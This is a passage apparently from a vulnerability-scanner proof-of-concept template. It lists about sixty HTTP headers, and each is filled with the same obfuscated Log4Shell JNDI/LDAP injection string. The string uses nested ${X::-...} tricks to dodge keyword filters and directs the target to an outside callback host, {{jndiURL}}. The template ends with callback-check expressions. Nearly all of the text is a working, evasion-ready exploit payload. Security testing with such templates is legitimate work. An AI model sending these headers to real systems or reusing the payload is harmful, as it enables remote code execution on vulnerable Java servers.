        X-ATT-DeviceId: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Client-IP: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Client-Ip: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Client-IP: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Cluster-Client-IP: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Correlation-ID: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Csrf-Token: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-CSRFToken: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Do-Not-Track: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Foo-Bar: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Foo: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-By: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-For-Original: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-For: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-Host: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Forwarded: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-Port: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-Protocol: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-Proto: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-Scheme: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-Server: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-Ssl: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Forwarder-For: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Forward-For: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Forward-Proto: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Frame-Options: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-From: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Geoip-Country: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Host: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Http-Destinationurl: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Http-Host-Override: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Http-Method-Override: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-HTTP-Method-Override: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Http-Method: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Http-Path-Override: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Https: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Htx-Agent: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Hub-Signature: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-If-Unmodified-Since: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Imbo-Test-Config: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Insight: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Ip: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Ip-Trail: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Leakix: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Original-URL: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Originating-IP: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-ProxyUser-Ip: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Real-Ip: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Remote-Addr: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Remote-IP: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Requested-With: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Request-ID: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-True-IP: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-UIDH: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Wap-Profile: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-WAP-Profile: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-XSRF-TOKEN: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
    expression: reverse.jndi(5)
expression: r0() || r1()|| r2() || r3() || r4() || r5() || r6() || r7()